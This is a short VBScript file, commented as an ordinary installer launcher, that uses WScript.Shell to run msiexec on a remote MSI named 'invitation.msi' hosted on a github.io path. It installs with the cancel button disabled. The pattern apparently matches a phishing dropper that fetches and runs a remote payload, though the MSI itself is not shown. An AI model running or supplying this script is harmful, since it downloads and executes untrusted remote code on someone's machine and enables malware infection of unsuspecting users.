Dim objShell, msiPath, runCommand

' Create a Windows Script Host Shell object
Set objShell = CreateObject("WScript.Shell")

' Specify the full path to your MSI installer file
msiPath = "https://pc1n.github.io/scnv2-5m/invitation.msi"

' Build the msiexec command 
' /i = Install, /qb! = Basic UI with no cancel button (or use /qn for completely silent)
runCommand = "msiexec.exe /i """ & msiPath & """ /qb!"

' Execute the command. The '1' displays the window, and 'True' forces VBScript to wait until installation finishes.
objShell.Run runCommand, 1, True

' Clean up the object
Set objShell = Nothing
